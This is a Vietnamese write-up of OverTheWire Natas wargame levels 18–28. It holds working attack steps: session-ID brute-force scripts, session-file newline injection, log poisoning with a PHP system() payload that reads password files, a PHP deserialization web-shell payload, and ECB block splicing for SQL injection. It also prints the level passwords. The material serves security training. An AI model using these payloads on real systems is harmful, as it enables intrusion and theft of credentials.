- Về flow chương trình : Đầu tiên cho `$showform=true`cho biết biểu mẫu đăng nhập sẽ được hiển thị lần đầu tiên khi trang web được tải lên. Hàm `my_session_start()` được gọi để để khởi động một session. Nếu session đã tồn tại, thông tin đăng nhập sẽ được in ra và biến `$showform` sẽ được đặt về false, nghĩa là biểu mẫu đăng nhập sẽ không được hiển thị. Nếu session chưa thì kiểm tra người dùng đã nhập đầy đủ thông tin đăng nhập chưa, sau đó hàm `createID` sẽ được sử dụng để tạo một ID mới cho session này, và hàm `isValidAdminLogin` sẽ được sử dụng để kiểm tra thông tin đăng nhập có đúng với thông tin quản trị viên hay không.Nếu thông tin đăng nhập là chính xác, phiên làm việc mới sẽ được khởi động và thông tin đăng nhập sẽ được in ra trên trang web. Biến $showform sẽ được đặt về false, nghĩa là biểu mẫu đăng nhập sẽ không được hiển thị.Nếu thông tin đăng nhập không chính xác hoặc không được cung cấp đầy đủ, biểu mẫu đăng nhập sẽ được hiển thị cho người dùng để nhập lại. Biến $showform vẫn giữ giá trị true

Tuy code có vẻ khó hiểu nhưng cơ bản bài này sử dụng một custom-session-manager, với giá trị của PHPSESSID nằm ngẫu nhiên trong khoảng từ (1, 640). Tất nhiên admin cũng chỉ có thể nằm trong mớ giá trị đó thôi, và chúng ta sẽ thử dần dần từng giá trị cho đến khi thành công.

- Dùng burp suite để bắt request đăng nhập `admin/123`

    ![](https://i.imgur.com/xnt0iGU.png)

- Chuyển qua tab Intruder và chọn số 312 để thực hiện payload brute force `PHPSESSID` từ `1->640`
- Tại payload 119 đã nhận được kết quả thành công

    ![](https://i.imgur.com/sgz7W1K.png)

- Quan sát được rằng ta đã có được password của level tiếp theo


---
### 19. Lv18 -> Lv19

>username/password : **natas19/8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s** 

![](https://i.imgur.com/wNOWbUm.png)

level này cho chúng ta hint rằng là giống level trước nhưng chỉ khác giá trị PHPSESSID sẽ không còn đơn giản nữa. Vậy ý tưởng khai thác đương nhiên cũng giống bài trước.
Đầu tiên kiểm tra khi đăng nhập bằng tài khoản `admin/123` thì thấy `PHPSESSID=35372d61646d696e`. Có thể đây là một loại encode nào đó nhưng không quá phức tạp. Quan sát thì cũng dễ nhận thấy nó là một chuỗi HEX. Thử decode `hex2text` bằng các tool online thì thấy giá trị nó chính là `57-admin`. Vậy là đã rõ format của nó, bây giờ ta chỉ cần đi brute-force giá trị như level trước rồi gắn giá trị đó với `-admin` sau đó encode sang HEX và gửi đi là thành công.
Để tự động hóa được các công đoạn ở trên ta có thể sử dụng đoạn code này 

```
import requests
import binascii

url = "http://natas19.natas.labs.overthewire.org"

s = requests.Session()
s.auth = ('natas19', '8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s')

for x in range(1000):
    tmp = str(x) + "-admin"
    val = binascii.hexlify(tmp.encode('utf-8'))

    cookies = dict(PHPSESSID=val.decode('ascii'))
    r = s.get(url, cookies=cookies)
    if "Login as an admin to retrieve" in r.text:
        pass
    else:
        print(r.text)
        break
```

Quan sát kết quả và thấy được rằng password level tiếp theo là `guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH`

---
### 20. Lv19 -> Lv20

>username/password : **natas20/guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH** 

Bài này cũng yêu cầu ta phải login với tư cách là một admin thì mới có thể truy cập được password cho level tiếp theo.

![](https://i.imgur.com/DKdWuuA.png)

Ở đây trang web hiển thị một số warning. Đây có lẽ là một missconfigure. Thử kiểm tra code và giải thích một chút nào.

- `debug()` : để in ra thông báo.
- `print_credentials()` : Để in ra password cho level tiếp theo nếu thõa yêu cầu.
- `myopen(), myclose(),mydestroy(), mygarbage()`: Là các hàm không cần thiết và luôn trả về true
- `myread()`:Hàm này được sử dụng để đọc dữ liệu từ một tệp session được lưu trữ. Đầu tiên kiểm tra xem giá trị của `$sid` có hợp lệ hay không bằng cách sử dụng hàm `strspn` để kiểm tra xem giá trị `$sid` có chứa các ký tự đúng đắn hay không. Nếu giá trị `$sid` không hợp lệ, hàm sẽ trả về một chuỗi rỗng và in ra một thông báo lỗi. Nếu giá trị `$sid` hợp lệ, hàm sẽ tạo ra một tên tệp tin session bằng cách ghép chuỗi. Kiểm tra tệp đó có tồn tại không, nếu không thì xuất lỗi, còn có thì hàm sử dụng hàm `file_get_contents` để đọc nội dung của tệp và lưu trữ trong biến `$data`. Sau đó, hàm tạo ra một mảng rỗng `$_SESSION` và sử dụng vòng lặp `foreach` để xử lý từng dòng trong nội dung của tệp. Trong vòng lặp, mỗi dòng được tách thành hai phần bằng hàm "explode"
Ví dụ : Nếu dòng đầu tiên trong nội dung của tệp phiên là "`username admin`", hàm sẽ tách dòng này thành hai phần: "`username`" và "`admin`". Sau đó, hàm sẽ gán giá trị "`admin`" cho phần tử `$_SESSION["username"]`.
- `mywrite()`: Hàm này được sử dụng để ghi dữ liệu session vào một tệp. Đầu tiên kiểm tra xem giá trị của `$sid` có hợp lệ hay không bằng cách sử dụng hàm `strspn` để kiểm tra xem giá trị `$sid` có chứa các ký tự đúng đắn hay không. Nếu giá trị `$sid` không hợp lệ, hàm sẽ trả về một chuỗi rỗng và in ra một thông báo lỗi. Nếu giá trị `$sid` hợp lệ, hàm sẽ tạo ra một tên tệp tin session bằng cách ghép chuỗi. Hàm sau đó sử dụng hàm `ksort` để sắp xếp mảng `$_SESSION` theo thứ tự tăng dần của `KEY`.Tiếp theo, hàm sử dụng vòng lặp để duyệt qua các phần tử trong mảng `$_SESSION`. Mỗi phần tử được lưu trữ trong biến `$key` và `$value`. Và lưu tất cả vào trong biến `$data` trên từng dòng riêng biệt. Cuối cùng, hàm sử dụng hàm `file_put_contents` để ghi nội dung của `$data` vào tệp tin session và sử dụng hàm `chmod` để đặt quyền truy cập của tệp tin phiên là `0600`.
- Đi vào flow của chương trình :
    - Đầu tiên khi ta submit form thì quá trình set giá trị cho biến `$_SESSION` được thực hiện qua hàm `mywrite()` và các giá trị của biến $_SESSION sẽ được lưu vào file thành 1 dòng
    - Sau đó là quá trình đọc thông tin login của user, thao tác lấy giá trị được đảm nhiệm bởi hàm `myread()`.

Về cơ bản thì nếu ta ta thực hiện nhập một tên bất kỳ ví dụ `zios` vào trong box vào submit thì chương trình sẽ dùng `mywrite()` để lưu `name zios` trên một dòng. Sau đó dùng `mywrite()`để đọc ra.

Lỗi nó phát sinh ở đây, đó là không có cơ chế kiểm tra đầu vào, còn hàm `myread()` thì đọc tất cả các dòng trong tệp. Vậy nên ta có thể bypass được bằng cách nhập nhiều dòng. Sau đó `mywrite()` sẽ lưu tất cả vào và `mywrite()` sẽ đọc tất cả.

Vậy ta nên xác định cần lưu gì trên các dòng khác. Quan sát hàm `print_credentials()` chỉ xuất ra password khi thõa điều kiện, tức là `$_SESSION["admin"]=1`. Vậy ta cần dùng `mywrite()` để lưu `admin 1` trên một dòng mới và chờ `myread()` đọc và thực hiện gán nó là xong.

Xong bước phân tích và ý tưởng, ta bắt đầu thực hiện :
- Nhập payload zios\n admin 1
- 
    ![](https://i.imgur.com/AUBWhYb.png)

- Quan sát và nhận thấy rằng chương trình có vẻ không hoạt động như ý mình muốn. Nó không xuống dòng được. 
- Ta thử truyền bắt burp suite để quan sát thì thấy vấn đề nằm ở việc encode, làm chương trình không hiểu đó là dấu xuống dòng.

    ![](https://i.imgur.com/JysWU1K.png)

- Thực hiện chuyển đổi payload thành dạng URL encode đúng như sau zios%0aadmin%201 và kiểm tra lại thì thấy nó chính xác rồi. Nhấn forward để gửi gói tin đi.

    ![](https://i.imgur.com/dsW3cLR.png)

- Quan sát và thấy rằng ta đã có password cho level tiếp theo.

    ![](https://i.imgur.com/Mqsqgck.png)

---
### 21. Lv20 -> Lv21

>username/password : **natas21/89OWrTkGmiLZLv12JY4tLj2c4FW0xn56** 

Ở bài này nó cho ta 2 trang web để khai thác.

![](https://i.imgur.com/BM17c0X.png)

![](https://i.imgur.com/w0DxEku.png)

Đối với trang web đầu tiên thì thật sự không có gì khi ta xem source. Nó chỉ khởi tạo session và dùng hàm `print_credentials()` để kiểm tra và in ra password cho level tiếp theo.

Còn ở trang web thứ hai thì cho phép chúng ta thực hiện định dạng chữ `Hello world!`.

Tuy nhiên thì cả hai đều sử dụng chung cookie. Vậy nên ý tưởng của chúng ta đó là thay đổi cookie ở site thứ 2 sao cho `$_SESSION["admin"] = 1` và sử dụng nó lên site thứ 1 để lấy được password.

Bắt đầu khai thác:
- Ở site 2 ta chú ý đến đoạn code 
    ```
    if(array_key_exists("submit", $_REQUEST)) { 
        foreach($_REQUEST as $key => $val) { 
            $_SESSION[$key] = $val; 
        } 
    } 
    ```
    Đây chính là lỗ hỏng ta có thể khai thác được để `$_SESSION["admin"] = 1`. Nó sẽ thực hiện duyệt qua tất cả các `{key:val}` trong request và thực hiện `$_SESSION[$key] = $val`. Vậy nên nếu ta có thể tạo được một `{key:val}={admin:1}` thì ta sẽ thành công đạt được mục đích.
- Thực hiện bắt burp suite để quan sát request
    
    ![](https://i.imgur.com/Hxqrof8.png)

- Tiếp sau đó điều chỉnh tham số để có thể tận dụng được lỗi trên tạo ra cookie có `$_SESSION["admin"] = 1`.

    ![](https://i.imgur.com/89tHcHd.png)

- Dùng burp suit để thay đổi PHPSESSID ở site 2 cho site 1 và quan sát kết quả ở site 1 thì thấy được rằng ta đã có thể lấy được password cho level tiếp theo.

    ![](https://i.imgur.com/hkpDl38.png)
    
---
### 22. Lv21 -> Lv22

>username/password : **natas22/91awVM9oDiUGm33JdzM7RVLBS8bz9n0s** 

Vào thì level này chả có gì cả. Thực hiện kiểm tra source thì thấy rằng trang web của chúng ta đã bị redirect bằng hàm `header()`.

Và nếu trang web ta khi thực hiện phương thức `GET` có chứa tham số `revelio` thì sẽ hiển thị password cho level tiếp theo.

Tuy nhiên làm sao để bypass được cơ chế header() này. Thì đầu tiên ta cần hiểu cơ chế của nó, khi redirect bằng header() thì sẽ do phía trình duyệt xử lý, chứ không phải là server redirect trực tiếp. Hay nói cách khác, toàn bộ nội dung của file trước khi redirect vẫn được tải về chứ không hề bị ngắt sau khi gọi hàm header(). Ta có thể dễ dàng kiểm tra điều này bằng cách xem tab Network trong Web Developer Tools của trình duyệt

Vậy nên ta có thể sử dụng tab `repeate` của burp suite để kiểm tra `respone` khi có tham số `revelio`

![](https://i.imgur.com/lJcP4JE.png)

Quan sát có thể thấy được password của level tiếp theo.

---
### 23. Lv22 -> Lv23

>username/password : **natas23/qjA8cOoKFTzJhtV0Fzvt92fgvxVnVRBj** 

Level này cho chúng ta nhập passwod vào box.

![](https://i.imgur.com/pa3prEz.png)

Thực hiện kiểm tra đoạn code 
```
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas24 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>  
```
Thì có thể quan sát thấy rằng chương trình sẽ hiển thị password level tiếp theo cho chúng ta nếu chúng ta nhập một password có chứa nội dung `iloveyou` và giá trị của `$_REQUEST["passwd"]` lớn hơn 10.
Thử payload `11iloveyouzios` và quan sát thì thấy ta đã có thể lấy được password. Có thể giải thích đơn giản như sau là hàm `strstr` sẽ trả về kết quả khác null, vì chuỗi `iloveyou` xuất hiện trong giá trị này. Sau đó, giá trị của `passwd` sẽ được so sánh với số `10`, bằng cách sử dụng toán tử `>` trong biểu thức điều kiện. Vì `11iloveyouzios` được chuyển đổi thành số `11`, và `11 > 10` là đúng, nên đoạn mã sẽ in ra thông báo về thông tin đăng nhập cho cấp độ tiếp theo.



![](https://i.imgur.com/zaSQHZ1.png)


---
### 24. Lv23 -> Lv24

>username/password : **natas24/0xzF30T9Av8lgXhW7slhFCIsVKAPyl2r** 

Ở level này cũng khá giống level trước, cũng yêu cầu nhập password để có thể có được thông tin password level tiếp. Kiểm tra source code thì thấy 
```
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"<censored>")){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas25 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>  
```
Nó thực hiện so sánh password mình nhập với password ẩn, Nếu kết quả chính xác tức là `strcmp return 0` thì sẽ xuất ra password level tiếp theo. Ngược lại sẽ xuất ra `Wrong`

Nhìn sơ qua code thì có vẻ không có lỗi nào, nhưng ở đây nó tồn tại lỗ hỏng tại hàm strcmp. Nếu trường hợp ta truyền tham số vào không phải là một string như mong đợi mà là một mảng thì kết quả sẽ ra sao?
Câu trả lời đó chính là kết quả sẽ trả về 0, tức là 2 chuỗi bằng nhau. Thế tại sao lại như vậy?
-->Vì nếu một mảng được truyền vào làm đối số cho hàm `strcmp()`, PHP sẽ ép kiểu mảng đó thành một chuỗi. Để chuyển đổi một mảng thành chuỗi, PHP sử dụng từ `Array` để biểu diễn chuỗi đó. Do đó, nếu bạn so sánh một chuỗi với một mảng, hàm` strcmp() `sẽ trả về số `0`, vì chuỗi `Array` sẽ luôn bằng với một mảng

Vậy payload của chúng ta sẽ là `http://natas24.natas.labs.overthewire.org/?passwd[]`

Quan sát và thấy được rằng chúng ta đã có thể lấy được password cho level tiếp theo.

![](https://i.imgur.com/VoglWz6.png)


---
### 25. Lv24 -> Lv25

>username/password : **natas25/O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx** 

Bài này cung cấp cho t một quote, cho phép ta chuyển đổi ngôn ngữ 

![](https://i.imgur.com/042WoDL.png)

Thực hiện kiểm tra code và giải thích sơ qua code :
- `setLanguage()` : để chỉnh ngôn ngữ, mặc định là tiếng anh
- `safeinclude()` : để bảo vệ trang web khỏi các cuộc tấn công như traversal directory hoặc truy cập trái phép vào các tệp chứa mật khẩu.
- `listFiles()`: được sử dụng để liệt kê các tệp trong một thư mục đã cho
- `logRequest()`: Là một hàm sử dụng để ghi lại các thông tin liên quan đến một yêu cầu từ phía người dùng. Hàm sử dụng hàm `date()` để lấy thời gian hiện tại, sử dụng biến `$_SERVER` để lấy thông tin `User Agent` và thông điệp cần ghi lại (được truyền vào dưới dạng tham số), và ghi chúng vào một tệp tin ghi log bằng cách sử dụng hàm `fwrite()`.

Vậy ta rút ra được các thông tin sau khi đọc qua code :
- `safeinclude()` sẽ bảo vệ trang web khỏi cuộc tấn công traversal directory bằng cách xóa `../` nhưng nếu ta dùng `....//` nó sẽ xóa mất `../` thì còn lại `../`. Nên ta vẫn có thể thực hiện tấn công traversal directory.
- Tuy nhiên vì `safeinclude()` chặn `filename=natas_webpass` nên ta phải thực hiện đọc file khác. Ở đây qua hàm `logRequest()` ta biết được file log, nên ta sẽ thực hiện đọc file đó. 
- Và đồng thời ta còn có thể thay đổi `User Agent` để có thể thực thi một số tác vụ theo ý ta.

Ý tưởng đã có, ta cùng thực hiện khai thác trang web theo các bước như sau :

- Đầu tiên ta sẽ lấy PHPSESSID bằng burpsuite.

    ![](https://i.imgur.com/6KkMMEB.png)

    Vậy đường dẫn hoàn chỉnh file log của chúng ta sẽ là `/var/www/natas/natas25/logs/natas25_kuongrikqd7cskna51v3s8dig1.log`

- Thực hiện cuộc tấn công traversal directory để đọc file log này bằng payload `http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_kuongrikqd7cskna51v3s8dig1.log`

    ![](https://i.imgur.com/SxL2dWC.png)

    Vậy là ta đã thành công đọc được file log này. 
- Tuy nhiên vẫn chưa thể đọc được password cho level tiếp theo. Đây là lúc chúng ta dùng tới `User Agent`. Thực hiện thay đổi nội dung `User Agent` thành 
    ```
    <?php system("cat /etc/natas_webpass/natas26"); ?>
    ```
    
    ![](https://i.imgur.com/muLZHxy.png)

- Quan sát và thấy được rằng chúng ta đã có được password cho level tiếp theo.
---
### 26. Lv25 -> Lv26

>username/password : **natas26/8A506rfIAXbKKk68yJeuTuRq4UfcK70k** 

Đây là một trang web cho chúng ta vẽ các đường thẳng theo tọa độ.

![](https://i.imgur.com/DbsBFPC.png)

Ta thực hiện đọc code và giải thích sơ lược về code để hiểu thêm cách hoạt động của nó:
- class Logger{}: được sử dụng để ghi log các thông tin trong ứng dụng
    - Các thuộc tính private như :
        - `logFile`: đường dẫn tới file log.
        - `initMsg`: thông báo được ghi vào log khi bắt đầu một phiên làm việc mới.
        - `exitMsg`: thông báo được ghi vào log khi kết thúc một phiên làm việc.
    - Các phương thức như :
        - `__construct($file)`: phương thức khởi tạo.
        - `log($msg)`: phương thức ghi thông tin vào file log
        - `__destruct()`: phương thức được gọi khi đối tượng Logger bị hủy
- `showImage()`: Kiểm tra file, nếu tồn tại thì hiển thị hình ảnh đó lên.
- `drawFromUserdata()`: Được sử dụng để vẽ các đường thẳng trên một hình ảnh. Hàm nhận một tham số là một hình ảnh `$img` và kiểm tra xem có tồn tại các tham số `x1, y1, x2, y2` trong `$_GET` hay không. Nếu có, hàm sẽ sử dụng các tham số này để vẽ một đường thẳng trên hình ảnh. Tiếp theo, hàm kiểm tra xem cookie `drawing` có tồn tại hay không. Nếu có, hàm sẽ giải mã cookie, chuyển đổi chuỗi đã giải mã sang PHP object bằng `unserialize()`, và vẽ các đường thẳng tương tự như trên.
- `drawImage()`: có chức năng tạo một ảnh PNG mới với kích thước 400x300 pixel thông qua hàm `imagecreatetruecolor()`. Sau đó, hàm gọi tới hàm `drawFromUserdata()` để vẽ các phần tử lên ảnh. Tiếp theo, hàm `imagepng() `được sử dụng để lưu ảnh mới vào tệp có tên được truyền vào thông qua tham số `$filename`. Cuối cùng, hàm `imagedestroy()` được sử dụng để giải phóng bộ nhớ cho ảnh đã được tạo.
- `storeData()`: có chức năng lưu trữ dữ liệu vẽ từ người dùng vào cookie. Cụ thể, nó sẽ lấy tọa độ của điểm đầu và điểm cuối của đường thẳng được vẽ từ các tham số `x1, y1, x2 và y2` trong` $_GET`. Sau đó, nó sẽ kiểm tra xem cookie `drawing` đã tồn tại hay chưa. Nếu đã tồn tại, nó sẽ `unserialize` cookie `drawing` để lấy nội dung dữ liệu vẽ hình trước đó. Nếu không, nó sẽ tạo một mảng mới để lưu trữ dữ liệu vẽ. Sau đó, hàm này sẽ thêm dữ liệu vẽ mới vào mảng và lưu mảng này vào cookie drawing. Trước khi lưu mảng, nó sẽ serialize nó thành một chuỗi và mã hóa base64 để lưu trữ trong cookie.

Ở đây nó dùng hàm unserialize, cung cấp một class nhưng lại không dùng đến, và quan trọng hơn là cookie là thứ ta có thể điều khiển được. Vậy nên ta có thể nghĩ đến việc tận dụng class đã cho sẵn và thực hiện serialization nội dung độc hại để đọc password level tiếp theo tiếp đến dùng burpsuite gửi nó thay thế cho cookie. Và chờ nó giải mã cookie thế là ta đã tạo được một object PHP có chứa câu lệnh độc hại. Ta chỉ cần kích hoạt nó và thế là xong, chúng ta sẽ có thể có được password cho level tiếp theo.

Ý tưởng đã có, bây giờ chúng ta sẽ hiện thực nó như sau :
- Đầu tiên tạo một cookie băng cách thực hiện serialization một đối tượng Logger.

    ```
    <?php
    class Logger{
            private $logFile;
            private $initMsg;
            private $exitMsg;
        
            function __construct(){
                $this->initMsg = "Readpass\n";
                $this->exitMsg = "<?php system('cat /etc/natas_webpass/natas27');?>";
                $this->logFile = "img/level26.php";
            }                       
                        
        }
    $logger = new Logger();
    echo base64_encode(serialize($logger));
    ?>
    #Result : Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNToiaW1nL2xldmVsMjYucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6OToiUmVhZHBhc3MKIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NDk6Ijw%2FcGhwIHN5c3RlbSgnY2F0IC9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7Pz4iO30%3D
    ```
- Tiếp sau đó dùng burp suite bắt gói tin và thay thế cookie drawing thành Result ở trên.

    ![](https://i.imgur.com/5X32R3f.png)

- Sau cùng truy cập đến đường dẫn imgs/lv26.php để thực thi câu lệnh của chúng ta.

    ![](https://i.imgur.com/mtKwafl.png)

- Quan sát và có thể thấy chúng ta đã có được password cho level tiếp theo

---
### 27. Lv26 -> Lv27

>username/password : **natas27/PSO8xysPi00WKIiZZ6s6PtRmFy9cbxj3** 

Level này cho chúng ta một form đăng nhập, nếu đăng nhập bằng một tài khoản chưa có trong database sẽ thực hiện tạo tài khoản đó để lần sau đăng nhập. Nếu ta đăng nhập tài khoản đã tồn tại và điền đúng password thì sẽ hhiển thị thông tin cho chúng ta, ngược lại thì sẽ báo sai mật khẩu.

![](https://i.imgur.com/W4RWSKG.png)

![](https://i.imgur.com/n0DxchB.png)

![](https://i.imgur.com/d0QHLuh.png)

Thực hiện giải thích sơ lược qua code để hiểu rõ hơn cách hoạt động và tìm ra ý tưởng khai thác.
- `checkCredentials()` : dùng để kiểm tra đăng nhập của người dùng bằng cách so sánh username và password mà người dùng nhập vào với thông tin lưu trong database
- `validUser() `: được sử dụng để kiểm tra xem một tên người dùng có hợp lệ hay không
- `dumpData()`: được sử dụng để lấy thông tin của một người dùng được chỉ định. Có thực hiện`trim($usr)` để xóa đi khoảng trắng trong tên.
- createUser(): được dùng để tạo mới một user với cơ chế kiểm tra xem tên người dùng có khoảng trắng đầu hoặc cuối không.

Các hàm trên có sử dụng `mysqli_real_escape_string` nên các cuộc tấn công SQLI có vẻ sẽ không khả thi.

Ta thử đăng nhập vào `username=natas28` thì thấy nó thông báo là sai mật khẩu. Suy ra đã tồn tại `natas28` trong cơ sở dữ liệu. Vậy mục đích của ta là làm cách nào đó để đọc được password của user này là thành công.

Để làm được điều đó ta cần chú ý đến kích thước của trường dữ liệu username,password và ở đây khi kiểm tra đăng nhập thì không có cơ chế xóa khoảng trắng trong username nhưng khi hiển thị dữ liệu thì lại có. Điều này sinh ra sự nhập nhằng và bất đồng bộ. Đây chính là các điểm ta sẽ nhắm vào.

Vậy ta có thể bypass chương trình này như sau 
- Tạo một `username/password` là `test/realpass`
- Tạo một `username/password` là `test+(60*space)+end/temppass`
- Thực hiện đăng nhập bằng tài khoản `test+(60*space)/temppass` thì kết quả của chúng ta sẽ là `test/realpass`

Giải thích cho trường hợp trên ta cần hiểu ở đâu đó chính là kích thước của trường username khi tạo bảng là `64`, vậy nên khi ta thực hiện tạo tài khoản `test+(60*space)+end` nó sẽ bỏ qua giá trị `end` và tạo một tài khoản `test+(60*space)`. Ở đây giá trị cuối có thể là bất kỳ gì để bypass cơ chế kiểm tra của hàm `createUser()`. Khi ta đăng nhập với tài khoản `test+(60*space)/temppass` thì chương trình sẽ dùng `checkCredentials()` kiểm tra thì tồn tại một tài khoản thõa điều kiện `test+(60*space)/temppass`. Còn khi hiển thị dữ liệu bằng` dumpData()`. Nó lại thực hiện `trim($usr)` nên dẫn đến `test+(60*space)` sẽ được chương trình hiểu như là `test`. Từ đó hiển thị ra dữ liệu của tài khoản `test`.

Vậy thì tương tự như trên ta sẽ tạo payload để có thể khai thác trang web này và chiếm được password cho level 28 theo các bước như sau :
- Tạo một `username/password` là `natas28+(57*space)+end/temppass`
- Thực hiện đăng nhập bằng tài khoản `natas28+(57*space)/temppass` thì kết quả của chúng ta sẽ là `natas28/skrwxciAe6Dnb0VfFDzDEHcCzQmv3Gd4 `

![](https://i.imgur.com/oSHFpjO.png)

- Quan sát và có thể thấy ta đã có được password cho level tiếp theo.
---
### 28. Lv27 -> Lv28

>username/password : **natas4/skrwxciAe6Dnb0VfFDzDEHcCzQmv3Gd4** 

Level này không cung cấp code cho chúng ta, nó chỉ cung cấp giao diện là một chương trình search các đoạn Joke. Khi ta thử search thì nó dùng tham số `query` để tìm kiếm. Và dễ thấy rằng nội dung được truyền vào tham số `query` này là một dạng base64 decode.

![](https://i.imgur.com/b14La5X.png)

Nhưng khi ta decode ra thì kết quả rất xấu, có các ký tự đặc biệt. Vậy nên ta đoán rằng nó còn có thêm một số bước mã hóa khác. 

Bây giờ chúng ta sẽ mày mò và tìm ra một số đặt điểm như :
- search 1 giá trị nhưng sẽ ra nhiều kết quả --> đây là một list random joke
- Nó bị giới hạn ở 3 gạch đầu dòng. --> Có thể sẽ là một lỗi SQLi ở đây chăng? Tuy nhiên các ký tự đặt biệt như `',"` vẫn có thể được tìm thấy. Tức là đã có cơ chế ngăn chúng ta khai thác SQLi
- Sau khi thử thay đổi, xóa vài ký tự trong query thì nó hiện ra lỗi `Incorect amount of PKCS#7 padding for blocksize` --> Có liên quan đến `BlockCipher`.

Bây giờ ta chỉ có một dấu hiệu để đi tiếp đó là `BlockCipher`. Ta cần tìm ra `blocksize`, `category`,`offset payload` hoặc tốt hơn hết là tìm được cách decode nó nếu có thể.

- Đầu tiên ta sẽ cố gắng tìm kiếm blocksize bằng cách thử dùng burpt suite để brute-force tham số query. Từ 1 ký tự `a` đến 50 ký tự `a` trong tab `Intruder`. Và nhận thấy rằng từ ký tự 13 bắt đầu có sự thay đổi kích thước giá trị truyền vào tham số query so với trước và nó kéo dài đến ký tự 29. Điều này giúp ta khẳng định được rằng `blocksize=16`. Chúng ta có thể sử dụng đoạn code sau để tự động hóa việc đó 
    ```
    import requests
    import binascii
    import urllib
    import base64

    url ="http://natas28.natas.labs.overthewire.org/index.php"
    s = requests.Session()
    s.auth = ('natas28', 'skrwxciAe6Dnb0VfFDzDEHcCzQmv3Gd4')

    sample = ""

    while len(sample) < 50:
        data = {'query':sample}
        r = s.post(url, data=data)
        cipher = r.url.split('=')[1]
        cipher = urllib.parse.unquote(cipher)
        print("[*] %d chars.\t| %s" % (len(sample), cipher))
        sample += 'a'

    ```
- Tiếp đến ta cần xác định category. Để làm được điều này ta thử bắt một request với rất nhiều ký tự `a` và giải mã base64 để quan sát 

    ![](https://i.imgur.com/nH1kLqA.png)

    Có thể thấy rằng có sự lặp lại ở đây. Chứng tỏ rằng các khối dữ liệu được mã hóa độc lập với nhau và dùng chung một key. Từ đó ta có thể dễ dàng suy đoán đây là loại BlockCipher ECB vì đó chính là tính chất của nó.

- Bây giờ ta sẽ kiểm tra dữ liệu của chúng ta sẽ nằm trong block nào. Thử decode sang hex để dễ quan sát hơn thì có thể thấy tại block 1,2 giữ nguyên trên mọi query, còn block 3 thì có sự thay đổi, có thể dữ liệu chúng ta nằm trên block này 
 
    ![](https://i.imgur.com/ILkWKCV.png)

    Kiểm tra tiếp tại query 9 và 10 ký tự `a` thì thấy được rằng từ query 10 ký tự `a` thì block 3 có sự lặp lại. Từ đó suy ra chúng ta đã lắp đầy block 3 bằng ký tự a khi đạt 10 ký tự. Tiếp tục kiểm tra thì khi ta đạt 26 ký tự `a` thì sẽ lấp đầy block 4. Vậy nên ta có thể minh họa một cách hình học như sau 
    
    ![](https://i.imgur.com/uRIcjEl.png)

- Như đã nói ở trên, lỗi để khai thác bài này rất có thể là UNION SQLi. Vì cũng dễ nhận dạng khi cho thanh search, tìm dữ liệu trong database và có hiển thị cố định 3 gạch. Tuy nhiên chương trình lại tồn tại cơ chế ngăn khai thác SQLi nên ta cần bypass nó. Sau nhiều lần thử thì ta có thể thấy cơ chế của nó chính là thêm `\` để tránh lỗi cú pháp giúp ngăn chặn lỗi SQLi. Để thử thực hiện bypass nó ta cần đưa câu lệnh union vào vị trí block 4. Và hợp lý hóa câu lệnh truy vấn của chúng ta để xóa đi `\`.

Ý tưởng đã có, ta bắt đầu khai thác theo các bước sau:
- Đầu tiên tạo payload `aaaaaaaaa'union all select @@version;#` truyền vào tham số `query`. Và lấy giá trị query đã được mã hóa `G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIR27gK4CQl3Jcmv/0YAxYOytBCTd61ctLKvYtnsQLngvx1GES8aiVARyKx/W9KZ6FkhpVK6kb7k+mrhYRbT0vQ1/8rclRT/ClHAeUfXXwPjg==` đi decode. Thì lúc này cơ chế ngăn SQLi sẽ được triển khai và ta sẽ có các giá trị block như hình sau
    
    ![](https://i.imgur.com/IHOjUzr.png)

- Ta tận dụng đoạn query 10 ký tự `a` ở để có thể thay block 3 của 10 ký tự `a` thành block 3 của payload ta. Lúc này tại block 3 sẽ thay đổi như sau

    ![](https://i.imgur.com/wRbaRH4.png)

- Thực hiện encode đoạn hex ở trên ta được kết quả `G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeytBCTd61ctLKvYtnsQLngvx1GES8aiVARyKx%2FW9KZ6FkhpVK6kb7k%2BmrhYRbT0vQ1%2F8rclRT%2FClHAeUfXXwPjg%3D%3D`
- Thực hiện truyền vào tham số query ta nhận được kết quả là version của database. Vậy là chúng ta đã thành công khai thác được lỗi SQLi trong chương trình.

    ![](https://i.imgur.com/Hv3rn4w.png)

- Bây giờ ta sẽ thực hiện tương tự các bước như trên và thay đổi câu truy vấn một cách hợp lý để có thể lấy được password cho level tiếp theo.

    - Với câu lệnh đầu tiên `UNION all SELECT group_concat(table_name) from information_schema.tables;#` để tìm kiếm 
        
        ![](https://i.imgur.com/PGxiPjB.png)

    - Cứ tiếp tục tìm như thế thì sẽ ra được password. 

